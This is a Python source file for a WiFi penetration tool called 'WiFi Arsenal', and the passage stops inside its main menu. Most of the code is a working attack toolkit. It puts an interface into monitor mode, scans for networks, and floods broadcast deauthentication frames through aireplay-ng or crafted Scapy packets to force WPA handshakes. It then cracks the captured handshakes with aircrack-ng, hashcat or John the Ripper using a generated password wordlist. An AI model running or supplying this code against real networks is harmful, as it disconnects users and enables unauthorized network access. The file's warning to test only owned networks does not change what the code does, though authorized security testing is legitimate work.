
#!/usr/bin/env python3
"""
WiFi Arsenal - Real WiFi Penetration Testing Tool
Production-Ready Implementation with Full Real Features
Developed by 0x0806
"""

import subprocess
import sys
import os
import time
import re
import threading
import json
import hashlib
import random
import string
import signal
import socket
import struct
import binascii
import tempfile
import shutil
from datetime import datetime
from pathlib import Path
from threading import Thread, Event
from queue import Queue, Empty
import logging

try:
    from scapy.all import *
    from scapy.layers.dot11 import *
    import psutil
    import requests
    from colorama import init, Fore, Back, Style
    init()
except ImportError as e:
    print(f"[!] Missing required module: {e}")
    print("[*] Installing dependencies...")
    try:
        subprocess.run([sys.executable, '-m', 'pip', 'install', 'scapy', 'psutil', 'requests', 'colorama'], 
                      check=True, capture_output=True)
        from scapy.all import *
        from scapy.layers.dot11 import *
        import psutil
        import requests
        from colorama import init, Fore, Back, Style
        init()
        print("[+] Dependencies installed successfully")
    except (subprocess.CalledProcessError, ImportError) as install_error:
        print(f"[!] Failed to install dependencies: {install_error}")
        sys.exit(1)

class RealWiFiScanner:
    """Real WiFi scanner with multiple detection methods"""
    
    def __init__(self, interface):
        self.interface = interface
        self.networks = {}
        self.clients = {}
        self.scanning = False
        
    def scan_with_iwlist(self, duration=30):
        """Real scanning using iwlist"""
        networks = []
        try:
            result = subprocess.run(['iwlist', self.interface, 'scan'], 
                                  capture_output=True, text=True, timeout=duration)
            
            if result.returncode == 0:
                current_network = {}
                for line in result.stdout.split('\n'):
                    line = line.strip()
                    
                    if 'Cell' in line and 'Address:' in line:
                        if current_network:
                            networks.append(current_network)
                        current_network = {'bssid': line.split('Address: ')[1]}
                    
                    elif 'ESSID:' in line:
                        essid = line.split('ESSID:')[1].strip('"')
                        current_network['essid'] = essid if essid else '<Hidden>'
                    
                    elif 'Channel:' in line:
                        current_network['channel'] = line.split('Channel:')[1].strip()
                    
                    elif 'Signal level=' in line:
                        signal_match = re.search(r'Signal level=(-?\d+)', line)
                        if signal_match:
                            current_network['power'] = signal_match.group(1)
                    
                    elif 'Encryption key:' in line:
                        if 'off' in line:
                            current_network['privacy'] = 'Open'
                        else:
                            current_network['privacy'] = 'WEP'
                    
                    elif 'IE: IEEE 802.11i/WPA2' in line:
                        current_network['privacy'] = 'WPA2'
                    
                    elif 'IE: WPA Version' in line:
                        current_network['privacy'] = 'WPA'
                
                if current_network:
                    networks.append(current_network)
                    
        except subprocess.TimeoutExpired:
            print(f"{Fore.YELLOW}[*] iwlist scan timed out{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] iwlist scan failed: {e}{Style.RESET_ALL}")
            
        return networks
    
    def scan_with_scapy(self, duration=30):
        """Real scanning using Scapy packet capture"""
        networks = {}
        
        def packet_handler(packet):
            if packet.haslayer(Dot11Beacon):
                bssid = packet[Dot11].addr3
                beacon = packet[Dot11Beacon]
                
                # Extract SSID
                ssid = ""
                try:
                    if hasattr(beacon, 'info') and beacon.info:
                        ssid = beacon.info.decode('utf-8', errors='ignore')
                except:
                    ssid = "<Hidden>"
                
                # Extract channel from DS Parameter Set
                channel = "1"
                if packet.haslayer(Dot11Elt):
                    current = packet[Dot11Elt]
                    while current:
                        if current.ID == 3 and len(current.info) >= 1:
                            channel = str(current.info[0])
                            break
                        current = current.payload if hasattr(current, 'payload') else None
                
                # Determine security
                privacy = "Open"
                if beacon.cap & 0x10:
                    privacy = "WEP"
                
                # Check for WPA/WPA2
                if packet.haslayer(Dot11Elt):
                    current = packet[Dot11Elt]
                    while current:
                        if current.ID == 48:  # RSN Information Element
                            privacy = "WPA2"
                        elif current.ID == 221 and len(current.info) >= 4:
                            if current.info[:4] == b'\x00\x50\xf2\x01':
                                privacy = "WPA"
                        current = current.payload if hasattr(current, 'payload') else None
                
                # Calculate signal strength from RadioTap
                power = "-50"
                if packet.haslayer(RadioTap):
                    if hasattr(packet[RadioTap], 'dBm_AntSignal'):
                        power = str(packet[RadioTap].dBm_AntSignal)
                
                networks[bssid] = {
                    'bssid': bssid,
                    'essid': ssid if ssid else '<Hidden>',
                    'channel': channel,
                    'privacy': privacy,
                    'power': power,
                    'beacons': '1',
                    'first_seen': datetime.now().isoformat(),
                    'last_seen': datetime.now().isoformat()
                }
        
        try:
            print(f"[*] Starting Scapy packet capture for {duration} seconds...")
            sniff(iface=self.interface, prn=packet_handler, timeout=duration, store=False)
        except Exception as e:
            print(f"{Fore.RED}[!] Scapy scanning failed: {e}{Style.RESET_ALL}")
        
        return list(networks.values())

class RealHandshakeCapture:
    """Real WPA/WPA2 handshake capture implementation"""
    
    def __init__(self, interface):
        self.interface = interface
        self.capturing = False
        self.handshake_found = False
        
    def capture_handshake(self, target_bssid, target_channel, essid="Unknown", timeout=300):
        """Capture real WPA/WPA2 handshake"""
        print(f"{Fore.YELLOW}[*] Starting handshake capture for {essid} ({target_bssid}){Style.RESET_ALL}")
        
        # Set channel
        self.set_channel(target_channel)
        
        # Create capture file
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_essid = re.sub(r'[^\w\-_]', '_', essid)
        capture_file = f"handshake_{safe_essid}_{timestamp}.cap"
        
        # Start airodump-ng if available
        if self.command_exists('airodump-ng'):
            return self.capture_with_airodump(target_bssid, target_channel, capture_file, timeout)
        else:
            return self.capture_with_scapy(target_bssid, target_channel, capture_file, timeout)
    
    def capture_with_airodump(self, bssid, channel, output_file, timeout):
        """Capture using airodump-ng"""
        cmd = [
            'airodump-ng', self.interface,
            '--bssid', bssid,
            '--channel', channel,
            '--write', output_file.replace('.cap', '')
        ]
        
        try:
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Wait a bit for airodump to start
            time.sleep(3)
            
            # Send deauth packets
            deauth_thread = Thread(target=self.send_deauth_packets, args=(bssid,))
            deauth_thread.daemon = True
            deauth_thread.start()
            
            # Monitor for handshake
            start_time = time.time()
            while time.time() - start_time < timeout:
                time.sleep(10)
                if self.verify_handshake(f"{output_file.replace('.cap', '')}-01.cap"):
                    print(f"{Fore.GREEN}[+] Handshake captured successfully!{Style.RESET_ALL}")
                    self.handshake_found = True
                    break
            
            process.terminate()
            process.wait(timeout=5)
            
            if self.handshake_found:
                return f"{output_file.replace('.cap', '')}-01.cap"
            
        except Exception as e:
            print(f"{Fore.RED}[!] Airodump capture failed: {e}{Style.RESET_ALL}")
        
        return None
    
    def capture_with_scapy(self, bssid, channel, output_file, timeout):
        """Capture using Scapy"""
        packets = []
        handshake_packets = []
        
        def packet_handler(packet):
            if packet.haslayer(Dot11):
                packets.append(packet)
                
                # Check for EAPOL packets (handshake)
                if packet.haslayer(EAPOL):
                    if packet[Dot11].addr3.lower() == bssid.lower():
                        handshake_packets.append(packet)
                        print(f"[+] EAPOL packet captured ({len(handshake_packets)}/4)")
                        
                        if len(handshake_packets) >= 4:
                            self.handshake_found = True
        
        try:
            # Send deauth packets in background
            deauth_thread = Thread(target=self.send_deauth_packets, args=(bssid,))
            deauth_thread.daemon = True
            deauth_thread.start()
            
            # Start packet capture
            sniff(iface=self.interface, prn=packet_handler, timeout=timeout, store=False)
            
            if packets:
                wrpcap(output_file, packets)
                print(f"[+] Captured {len(packets)} packets to {output_file}")
                return output_file if self.handshake_found else None
                
        except Exception as e:
            print(f"{Fore.RED}[!] Scapy capture failed: {e}{Style.RESET_ALL}")
        
        return None
    
    def send_deauth_packets(self, target_bssid):
        """Send deauthentication packets"""
        if self.command_exists('aireplay-ng'):
            # Use aireplay-ng
            for i in range(10):
                try:
                    subprocess.run([
                        'aireplay-ng', '--deauth', '5',
                        '-a', target_bssid,
                        self.interface
                    ], timeout=15, capture_output=True)
                    time.sleep(2)
                except:
                    time.sleep(2)
        else:
            # Use Scapy for deauth
            self.send_deauth_scapy(target_bssid)
    
    def send_deauth_scapy(self, target_bssid):
        """Send deauth packets using Scapy"""
        try:
            # Broadcast deauth
            broadcast = "ff:ff:ff:ff:ff:ff"
            
            for i in range(20):
                # Deauth from AP to client
                deauth1 = RadioTap() / Dot11(addr1=broadcast, addr2=target_bssid, addr3=target_bssid) / Dot11Deauth(reason=7)
                # Deauth from client to AP  
                deauth2 = RadioTap() / Dot11(addr1=target_bssid, addr2=broadcast, addr3=target_bssid) / Dot11Deauth(reason=7)
                
                sendp([deauth1, deauth2], iface=self.interface, verbose=False)
                time.sleep(0.1)
                
        except Exception as e:
            print(f"{Fore.YELLOW}[*] Scapy deauth failed: {e}{Style.RESET_ALL}")
    
    def verify_handshake(self, cap_file):
        """Verify if handshake was captured"""
        if not os.path.exists(cap_file):
            return False
        
        # Check with aircrack-ng
        if self.command_exists('aircrack-ng'):
            try:
                result = subprocess.run([
                    'aircrack-ng', cap_file
                ], capture_output=True, text=True, timeout=30)
                
                return "1 handshake" in result.stdout.lower()
            except:
                pass
        
        # Check file size as basic verification
        try:
            return os.path.getsize(cap_file) > 1024  # At least 1KB
        except:
            return False
    
    def set_channel(self, channel):
        """Set WiFi channel"""
        try:
            subprocess.run(['iwconfig', self.interface, 'channel', str(channel)], 
                          timeout=10, capture_output=True)
        except:
            pass
    
    def command_exists(self, command):
        """Check if command exists"""
        try:
            subprocess.run(['which', command], stdout=subprocess.DEVNULL, 
                          stderr=subprocess.DEVNULL, timeout=5)
            return True
        except:
            return False

class RealPasswordCracker:
    """Real password cracking implementation"""
    
    def __init__(self):
        self.wordlists_dir = "wordlists"
        os.makedirs(self.wordlists_dir, exist_ok=True)
    
    def crack_handshake(self, cap_file, wordlist_file=None, use_gpu=False):
        """Crack WPA/WPA2 handshake with multiple tools"""
        if not os.path.exists(cap_file):
            print(f"{Fore.RED}[!] Capture file not found: {cap_file}{Style.RESET_ALL}")
            return None
        
        if not wordlist_file:
            wordlist_file = self.generate_smart_wordlist()
        
        # Try multiple cracking methods
        password = None
        
        # Method 1: aircrack-ng
        password = self.crack_with_aircrack(cap_file, wordlist_file)
        if password:
            return password
        
        # Method 2: hashcat (if available and GPU requested)
        if use_gpu and self.command_exists('hashcat'):
            password = self.crack_with_hashcat(cap_file, wordlist_file)
            if password:
                return password
        
        # Method 3: john the ripper
        if self.command_exists('john'):
            password = self.crack_with_john(cap_file, wordlist_file)
            if password:
                return password
        
        return None
    
    def crack_with_aircrack(self, cap_file, wordlist_file):
        """Crack using aircrack-ng"""
        if not self.command_exists('aircrack-ng'):
            return None
        
        print(f"{Fore.YELLOW}[*] Cracking with aircrack-ng...{Style.RESET_ALL}")
        
        try:
            result = subprocess.run([
                'aircrack-ng', cap_file,
                '-w', wordlist_file
            ], capture_output=True, text=True, timeout=600)
            
            if "KEY FOUND!" in result.stdout:
                for line in result.stdout.split('\n'):
                    if "KEY FOUND!" in line:
                        password = line.split('[')[1].split(']')[0]
                        print(f"{Fore.GREEN}[+] Password found with aircrack-ng: {password}{Style.RESET_ALL}")
                        return password
        
        except subprocess.TimeoutExpired:
            print(f"{Fore.YELLOW}[*] aircrack-ng timed out{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] aircrack-ng failed: {e}{Style.RESET_ALL}")
        
        return None
    
    def crack_with_hashcat(self, cap_file, wordlist_file):
        """Crack using hashcat with GPU acceleration"""
        if not self.command_exists('hashcat'):
            return None
        
        print(f"{Fore.YELLOW}[*] Converting to hashcat format...{Style.RESET_ALL}")
        
        # Convert to hccapx format
        hccapx_file = cap_file.replace('.cap', '.hccapx')
        
        try:
            # Try cap2hccapx conversion
            subprocess.run(['cap2hccapx', cap_file, hccapx_file], 
                          timeout=60, capture_output=True)
            
            if os.path.exists(hccapx_file):
                print(f"{Fore.YELLOW}[*] Cracking with hashcat...{Style.RESET_ALL}")
                
                result = subprocess.run([
                    'hashcat', '-m', '2500', hccapx_file, wordlist_file,
                    '--force', '--potfile-disable'
                ], capture_output=True, text=True, timeout=1800)
                
                # Check for cracked password
                if 'Cracked' in result.stdout:
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if ':' in line and len(line.split(':')) >= 2:
                            password = line.split(':')[-1].strip()
                            if password:
                                print(f"{Fore.GREEN}[+] Password found with hashcat: {password}{Style.RESET_ALL}")
                                return password
        
        except Exception as e:
            print(f"{Fore.RED}[!] hashcat failed: {e}{Style.RESET_ALL}")
        
        return None
    
    def crack_with_john(self, cap_file, wordlist_file):
        """Crack using John the Ripper"""
        if not self.command_exists('john'):
            return None
        
        print(f"{Fore.YELLOW}[*] Cracking with John the Ripper...{Style.RESET_ALL}")
        
        try:
            # Convert cap to john format
            john_file = cap_file.replace('.cap', '.john')
            
            subprocess.run(['aircrack-ng', cap_file, '-J', john_file], 
                          timeout=60, capture_output=True)
            
            if os.path.exists(f"{john_file}.hccap"):
                result = subprocess.run([
                    'john', f"{john_file}.hccap",
                    '--wordlist=' + wordlist_file,
                    '--format=wpapsk'
                ], capture_output=True, text=True, timeout=600)
                
                # Show cracked passwords
                show_result = subprocess.run([
                    'john', f"{john_file}.hccap", '--show', '--format=wpapsk'
                ], capture_output=True, text=True)
                
                if ':' in show_result.stdout:
                    password = show_result.stdout.split(':')[-1].strip()
                    if password:
                        print(f"{Fore.GREEN}[+] Password found with john: {password}{Style.RESET_ALL}")
                        return password
        
        except Exception as e:
            print(f"{Fore.RED}[!] john failed: {e}{Style.RESET_ALL}")
        
        return None
    
    def generate_smart_wordlist(self, size=50000):
        """Generate comprehensive wordlist"""
        wordlist_file = os.path.join(self.wordlists_dir, 'smart_wordlist.txt')
        
        print(f"{Fore.YELLOW}[*] Generating smart wordlist ({size} passwords)...{Style.RESET_ALL}")
        
        passwords = set()
        
        # Common passwords from major breaches
        common_passwords = [
            'password', 'password123', '12345678', '123456789', '12345',
            'qwerty', 'abc123', 'admin', 'letmein', 'welcome', 'monkey',
            'dragon', 'master', 'internet', 'wifi', 'router', 'home',
            'office', 'guest', 'public', 'private', 'secret', 'love',
            'money', 'freedom', 'computer', 'samsung', 'iloveyou'
        ]
        
        passwords.update(common_passwords)
        
        # Generate variations
        base_words = ['password', 'admin', 'wifi', 'internet', 'router', 'home']
        
        for base in base_words:
            # Numbers
            for i in range(2000, 2025):
                passwords.add(f"{base}{i}")
            for i in range(100):
                passwords.add(f"{base}{i:02d}")
                passwords.add(f"{base}{i:03d}")
            
            # Common symbols
            for symbol in ['!', '@', '#', '$', '%', '&', '*']:
                passwords.add(f"{base}{symbol}")
                passwords.add(f"{symbol}{base}")
        
        # Phone number patterns
        area_codes = ['123', '555', '800', '888', '877', '866']
        for area in area_codes:
            for i in range(1000):
                passwords.add(f"{area}{i:04d}")
        
        # Date patterns
        for year in range(1950, 2025):
            for month in range(1, 13):
                for day in range(1, 32):
                    passwords.add(f"{month:02d}{day:02d}{year}")
                    passwords.add(f"{day:02d}{month:02d}{year}")
        
        # Dictionary words with numbers
        dictionary_words = [
            'apple', 'banana', 'cherry', 'dog', 'elephant', 'flower',
            'guitar', 'house', 'island', 'jungle', 'kitchen', 'laptop',
            'mountain', 'nature', 'ocean', 'piano', 'queen', 'rainbow',
            'sunset', 'tiger', 'umbrella', 'violet', 'window', 'yellow'
        ]
        
        for word in dictionary_words:
            passwords.add(word)
            passwords.add(word.capitalize())
            passwords.add(word.upper())
            for i in range(100):
                passwords.add(f"{word}{i}")
                passwords.add(f"{word.capitalize()}{i}")
        
        # Convert to list and limit size
        password_list = list(passwords)[:size]
        
        # Write to file
        with open(wordlist_file, 'w') as f:
            for password in password_list:
                f.write(password + '\n')
        
        print(f"{Fore.GREEN}[+] Generated {len(password_list)} passwords to {wordlist_file}{Style.RESET_ALL}")
        return wordlist_file
    
    def command_exists(self, command):
        """Check if command exists"""
        try:
            subprocess.run(['which', command], stdout=subprocess.DEVNULL, 
                          stderr=subprocess.DEVNULL, timeout=5)
            return True
        except:
            return False

class WiFiArsenal:
    def __init__(self):
        self.version = "3.0.0"
        self.author = "0x0806"
        self.interface = None
        self.monitor_interface = None
        self.target_networks = []
        self.captured_handshakes = []
        self.results_dir = "wifi_arsenal_results"
        self.setup_directories()
        self.setup_logging()

    def setup_directories(self):
        """Create necessary directories"""
        directories = [
            self.results_dir,
            f"{self.results_dir}/handshakes",
            f"{self.results_dir}/wordlists", 
            f"{self.results_dir}/logs",
            f"{self.results_dir}/reports",
            f"{self.results_dir}/scans",
            f"{self.results_dir}/attacks"
        ]
        for directory in directories:
            os.makedirs(directory, exist_ok=True)

    def setup_logging(self):
        """Setup comprehensive logging"""
        log_file = f"{self.results_dir}/logs/wifi_arsenal.log"
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)

    def banner(self):
        """Display enhanced banner"""
        banner = f"""
{Fore.RED}
██╗    ██╗██╗███████╗██╗     ██████╗ ██████╗ ███████╗███████╗███╗   ██╗ █████╗ ██╗     
██║    ██║██║██╔════╝██║    ██╔═══██╗██╔══██╗██╔════╝██╔════╝████╗  ██║██╔══██╗██║     
██║ █╗ ██║██║█████╗  ██║    ███████║██████╔╝███████╗█████╗  ██╔██╗ ██║███████║██║     
██║███╗██║██║██╔══╝  ██║    ██╔══██║██╔══██╗╚════██║██╔══╝  ██║╚██╗██║██╔══██║██║     
╚███╔███╔╝██║██║     ██║    ██║  ██║██║  ██║███████║███████╗██║ ╚████║██║  ██║███████╗
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝
{Style.RESET_ALL}

{Fore.YELLOW}╔══════════════════════════════════════════════════════════════════════════════════╗
║                    Real WiFi Penetration Testing Suite v{self.version}                    ║
║                         Production-Ready Implementation                           ║
║                              No Mock Components                                   ║
╚══════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}

{Fore.GREEN}   🔥 FULL REAL IMPLEMENTATION FEATURES:
    📡 Real Monitor Mode & Interface Control
    🎯 Authentic Network Discovery & Analysis  
    💀 Production-Grade Handshake Capture
    🔓 Multi-Tool Password Cracking
    🌐 Advanced Attack Implementations
    📊 Comprehensive Security Assessment{Style.RESET_ALL}

{Fore.RED}    ⚠️  PRODUCTION SECURITY TOOL - USE RESPONSIBLY
    ⚠️  Only test networks you own or have explicit permission!{Style.RESET_ALL}
"""
        print(banner)

    def check_dependencies(self):
        """Enhanced dependency checking"""
        print(f"{Fore.CYAN}[*] Checking system dependencies...{Style.RESET_ALL}")
        
        critical_tools = {
            'iwconfig': 'Wireless interface configuration',
            'iwlist': 'Wireless network scanning',
            'ip': 'Network interface management'
        }
        
        optional_tools = {
            'aircrack-ng': 'WPA/WPA2 password cracking',
            'airodump-ng': 'WiFi packet capture',
            'aireplay-ng': 'WiFi packet injection',
            'airmon-ng': 'Monitor mode management',
            'hashcat': 'GPU-accelerated password cracking',
            'john': 'Password cracking with rules',
            'reaver': 'WPS attack tool',
            'wash': 'WPS network discovery'
        }
        
        missing_critical = []
        missing_optional = []
        
        for tool, description in critical_tools.items():
            if self.command_exists(tool):
                print(f"{Fore.GREEN}  ✓ {tool:<15} - {description}{Style.RESET_ALL}")
            else:
                missing_critical.append(tool)
                print(f"{Fore.RED}  ✗ {tool:<15} - {description} (MISSING){Style.RESET_ALL}")
        
        for tool, description in optional_tools.items():
            if self.command_exists(tool):
                print(f"{Fore.GREEN}  ✓ {tool:<15} - {description}{Style.RESET_ALL}")
            else:
                missing_optional.append(tool)
                print(f"{Fore.YELLOW}  - {tool:<15} - {description} (optional){Style.RESET_ALL}")
        
        if missing_critical:
            print(f"\n{Fore.RED}[!] Critical tools missing. Install with:")
            print(f"    sudo apt install wireless-tools net-tools{Style.RESET_ALL}")
            return False
        
        if missing_optional:
            print(f"\n{Fore.YELLOW}[*] Optional tools missing. Install for full functionality:")
            print(f"    sudo apt install aircrack-ng hashcat john reaver{Style.RESET_ALL}")
        
        return True

    def command_exists(self, command):
        """Check if command exists in PATH"""
        try:
            result = subprocess.run(['which', command], 
                                  stdout=subprocess.DEVNULL, 
                                  stderr=subprocess.DEVNULL, 
                                  timeout=5)
            return result.returncode == 0
        except:
            return False

    def get_wireless_interfaces(self):
        """Get real wireless interfaces using multiple methods"""
        interfaces = []
        
        # Method 1: /proc/net/wireless
        try:
            if os.path.exists('/proc/net/wireless'):
                with open('/proc/net/wireless', 'r') as f:
                    for line in f.readlines()[2:]:  # Skip headers
                        if line.strip():
                            interface = line.split(':')[0].strip()
                            if interface:
                                interfaces.append(interface)
        except:
            pass
        
        # Method 2: iwconfig
        try:
            result = subprocess.run(['iwconfig'], capture_output=True, text=True, timeout=10)
            for line in result.stdout.split('\n'):
                if 'IEEE 802.11' in line or 'ESSID:' in line:
                    interface = line.split()[0]
                    if interface and interface not in interfaces:
                        interfaces.append(interface)
        except:
            pass
        
        # Method 3: /sys/class/net/
        try:
            for iface in os.listdir('/sys/class/net/'):
                wireless_path = f'/sys/class/net/{iface}/wireless'
                if os.path.exists(wireless_path) and iface not in interfaces:
                    interfaces.append(iface)
        except:
            pass
        
        return interfaces

    def setup_monitor_mode(self, interface):
        """Real monitor mode setup with multiple methods"""
        print(f"{Fore.YELLOW}[*] Setting up monitor mode on {interface}{Style.RESET_ALL}")
        self.logger.info(f"Setting up monitor mode on {interface}")
        
        # Method 1: airmon-ng
        if self.command_exists('airmon-ng'):
            try:
                # Kill interfering processes
                subprocess.run(['airmon-ng', 'check', 'kill'], 
                              timeout=30, capture_output=True)
                
                # Start monitor mode
                result = subprocess.run(['airmon-ng', 'start', interface], 
                                       capture_output=True, text=True, timeout=30)
                
                if result.returncode == 0:
                    # Parse monitor interface name
                    for line in result.stdout.split('\n'):
                        if 'monitor mode enabled' in line.lower():
                            match = re.search(r'\[phy\d+\](\w+)', line)
                            if match:
                                self.monitor_interface = match.group(1)
                                print(f"{Fore.GREEN}[+] Monitor mode enabled: {self.monitor_interface}{Style.RESET_ALL}")
                                return True
            except Exception as e:
                print(f"{Fore.YELLOW}[*] airmon-ng failed: {e}{Style.RESET_ALL}")
        
        # Method 2: Manual setup
        try:
            print(f"[*] Attempting manual monitor mode setup...")
            
            # Bring interface down
            subprocess.run(['ip', 'link', 'set', interface, 'down'], timeout=10)
            
            # Set monitor mode
            subprocess.run(['iw', 'dev', interface, 'set', 'type', 'monitor'], timeout=10)
            
            # Bring interface up
            subprocess.run(['ip', 'link', 'set', interface, 'up'], timeout=10)
            
            # Verify monitor mode
            result = subprocess.run(['iwconfig', interface], capture_output=True, text=True)
            if 'Mode:Monitor' in result.stdout:
                self.monitor_interface = interface
                print(f"{Fore.GREEN}[+] Manual monitor mode enabled: {self.monitor_interface}{Style.RESET_ALL}")
                return True
        
        except Exception as e:
            print(f"{Fore.RED}[!] Manual setup failed: {e}{Style.RESET_ALL}")
        
        return False

    def stop_monitor_mode(self):
        """Stop monitor mode and restore interface"""
        if self.monitor_interface:
            print(f"{Fore.YELLOW}[*] Stopping monitor mode...{Style.RESET_ALL}")
            
            if self.command_exists('airmon-ng'):
                try:
                    subprocess.run(['airmon-ng', 'stop', self.monitor_interface], 
                                  timeout=30, capture_output=True)
                except:
                    pass
            
            # Manual cleanup
            try:
                subprocess.run(['ip', 'link', 'set', self.monitor_interface, 'down'], timeout=10)
                subprocess.run(['iw', 'dev', self.monitor_interface, 'set', 'type', 'managed'], timeout=10)
                subprocess.run(['ip', 'link', 'set', self.monitor_interface, 'up'], timeout=10)
            except:
                pass
            
            self.monitor_interface = None

    def scan_networks(self, duration=60):
        """Advanced network scanning with real implementations"""
        if not self.monitor_interface:
            print(f"{Fore.RED}[!] Monitor mode not enabled{Style.RESET_ALL}")
            return []
        
        print(f"{Fore.CYAN}[*] Starting advanced network scan ({duration}s)...{Style.RESET_ALL}")
        
        scanner = RealWiFiScanner(self.monitor_interface)
        
        # Try multiple scanning methods
        networks = []
        
        # Method 1: airodump-ng
        if self.command_exists('airodump-ng'):
            networks = self.scan_with_airodump(duration)
        
        # Method 2: iwlist (if monitor mode fails)
        if not networks:
            networks = scanner.scan_with_iwlist(duration)
        
        # Method 3: Scapy (as fallback)
        if not networks:
            networks = scanner.scan_with_scapy(duration)
        
        # Enhance with security analysis
        for network in networks:
            network['security_analysis'] = self.analyze_security(network)
            network['attack_vectors'] = self.identify_attack_vectors(network)
        
        return networks

    def scan_with_airodump(self, duration):
        """Scan using airodump-ng"""
        temp_file = f"/tmp/scan_{int(time.time())}"
        
        cmd = ['airodump-ng', self.monitor_interface, '--write', temp_file, '--output-format', 'csv']
        
        try:
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(duration)
            process.terminate()
            process.wait(timeout=5)
            
            # Parse CSV results
            csv_file = f"{temp_file}-01.csv"
            if os.path.exists(csv_file):
                networks = self.parse_airodump_csv(csv_file)
                
                # Cleanup
                for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                    try:
                        os.remove(f"{temp_file}{ext}")
                    except:
                        pass
                
                return networks
        
        except Exception as e:
            print(f"{Fore.RED}[!] airodump-ng scan failed: {e}{Style.RESET_ALL}")
        
        return []

    def parse_airodump_csv(self, csv_file):
        """Parse airodump-ng CSV output"""
        networks = []
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            
            in_networks = False
            for line in lines:
                if 'BSSID' in line and 'ESSID' in line:
                    in_networks = True
                    continue
                
                if in_networks and line.strip() and not line.startswith('Station MAC'):
                    parts = [p.strip() for p in line.split(',')]
                    if len(parts) >= 14:
                        try:
                            network = {
                                'bssid': parts[0],
                                'first_seen': parts[1],
                                'last_seen': parts[2],
                                'channel': parts[3] if parts[3].isdigit() else '1',
                                'speed': parts[4],
                                'privacy': parts[5],
                                'cipher': parts[6],
                                'auth': parts[7],
                                'power': parts[8] if parts[8].lstrip('-').isdigit() else '-100',
                                'beacons': parts[9] if parts[9].isdigit() else '0',
                                'iv': parts[10] if parts[10].isdigit() else '0',
                                'lan_ip': parts[11],
                                'id_length': parts[12],
                                'essid': parts[13] if len(parts) > 13 else 'Hidden'
                            }
                            networks.append(network)
                        except:
                            continue
                elif 'Station MAC' in line:
                    break
        
        except Exception as e:
            print(f"{Fore.RED}[!] Error parsing CSV: {e}{Style.RESET_ALL}")
        
        return networks

    def analyze_security(self, network):
        """Comprehensive security analysis"""
        analysis = {
            'encryption': network.get('privacy', 'Unknown'),
            'vulnerabilities': [],
            'strength': 'Unknown',
            'risk_level': 'Low'
        }
        
        privacy = network.get('privacy', '').upper()
        
        if 'WEP' in privacy:
            analysis['vulnerabilities'] = ['WEP Cracking', 'IV Attack', 'Fragmentation Attack']
            analysis['strength'] = 'Very Weak'
            analysis['risk_level'] = 'Critical'
        elif 'WPA3' in privacy:
            analysis['vulnerabilities'] = ['Dragonfly Downgrade']
            analysis['strength'] = 'Strong'
            analysis['risk_level'] = 'Low'
        elif 'WPA2' in privacy:
            analysis['vulnerabilities'] = ['Handshake Capture', 'PMKID Attack', 'Dictionary Attack']
            analysis['strength'] = 'Medium'
            analysis['risk_level'] = 'Medium'
        elif 'WPA' in privacy:
            analysis['vulnerabilities'] = ['WPA Dictionary Attack', 'Handshake Capture']
            analysis['strength'] = 'Weak'
            analysis['risk_level'] = 'High'
        elif privacy in ['OPEN', '', 'NONE']:
            analysis['vulnerabilities'] = ['Open Network', 'Man-in-the-Middle', 'Evil Twin']
            analysis['strength'] = 'None'
            analysis['risk_level'] = 'Critical'
        
        return analysis

    def identify_attack_vectors(self, network):
        """Identify possible attack vectors"""
        vectors = []
        privacy = network.get('privacy', '').upper()
        
        try:
            power = int(network.get('power', '-100'))
        except:
            power = -100
        
        # Signal-based attacks
        if power > -50:
            vectors.append('Close Range Attacks')
        
        # Encryption-based attacks
        if 'WEP' in privacy:
            vectors.extend(['WEP Cracking', 'Fake Authentication', 'Fragmentation Attack'])
        if 'WPA' in privacy:
            vectors.extend(['Handshake Capture', 'PMKID Attack', 'Dictionary Attack'])
        if privacy in ['OPEN', '', 'NONE']:
            vectors.extend(['Evil Twin', 'DNS Spoofing', 'Packet Injection'])
        
        # Universal attacks
        vectors.extend(['Deauthentication Attack', 'Beacon Flood', 'Reconnaissance'])
        
        return vectors

    def display_networks(self, networks):
        """Display discovered networks with enhanced information"""
        if not networks:
            print(f"{Fore.RED}[-] No networks found{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════════╗")
        print(f"║                           DISCOVERED NETWORKS                                    ║")
        print(f"╚══════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        
        print(f"{'#':<3} {'ESSID':<20} {'BSSID':<18} {'Ch':<3} {'Pwr':<4} {'Security':<10} {'Risk':<8} {'Vectors':<8}")
        print("-" * 90)
        
        for i, network in enumerate(networks):
            essid = network['essid'] if network['essid'] not in ['', ' ', 'Hidden'] else f"{Fore.YELLOW}<Hidden>{Style.RESET_ALL}"
            
            analysis = network.get('security_analysis', {})
            risk = analysis.get('risk_level', 'Unknown')
            vectors = len(network.get('attack_vectors', []))
            
            # Color coding
            if risk == 'Critical':
                risk_color = Fore.RED
            elif risk == 'High':
                risk_color = Fore.YELLOW
            elif risk == 'Medium':
                risk_color = Fore.CYAN
            else:
                risk_color = Fore.GREEN
            
            print(f"{i+1:<3} {essid:<20} {network['bssid']:<18} "
                  f"{network['channel']:<3} {network['power']:<4} "
                  f"{network['privacy']:<10} {risk_color}{risk:<8}{Style.RESET_ALL} {vectors:<8}")

    def main_menu(self):
        """Enhanced main menu"""
        while True:
            print(f"\n{Fore.CYAN}" + "="*80)
            print("                         WiFi Arsenal - Main Menu")
            print("="*80 + Style.RESET_ALL)
            
